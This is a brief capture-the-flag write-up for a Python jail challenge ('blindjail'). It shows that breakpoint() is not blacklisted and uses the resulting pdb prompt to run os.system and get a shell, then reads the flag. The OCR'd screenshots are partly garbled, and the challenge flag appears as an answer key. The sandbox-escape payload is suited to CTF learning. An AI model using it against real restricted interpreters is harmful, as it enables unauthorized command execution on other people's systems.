# blindjail
> There is no escape, sometimes going in blind makes other attributes stronger.

## About the Challenge
We were given a server to connect where we can execute a python code (Classic PyJail) but there are some filter like we can't use `exec()` or `eval()` function 


[Image extracted text: WELCOME
To
THE
BLINDJAIL
fret
not
that
you
cannot
see,
fret
that
you
cannot
leave
>>>
exec
Nope
exec
is
banned !
>>>
eval
Nope
eval
is
banned !
>>>
print(1)
1
>>>]


## How to Solve?
I tried several function and luckily the program didn't blacklist `breakpoint()` function. So the final payload will be like this

```python
breakpoint()
...
import os
os.system("sh")
```

[Image extracted text: WELCOME
To
THE
BLINDJAIL
fret
not
that
cannot
see,
fret
that
you cannot
leave
>>>
breakpoint ( )
~~Return-
<string>(1) <module> ( )->None
(Pdb)
import
05
(Pdb)
0s . system( "bash" )
1s
txt
main.py
cat flag.txt
nitectf{sl1d3_Over_th3se_ttribut3s}]
you
flag.]


```
nitectf{sl1d3_0ver_th3se_4ttribut3s}
```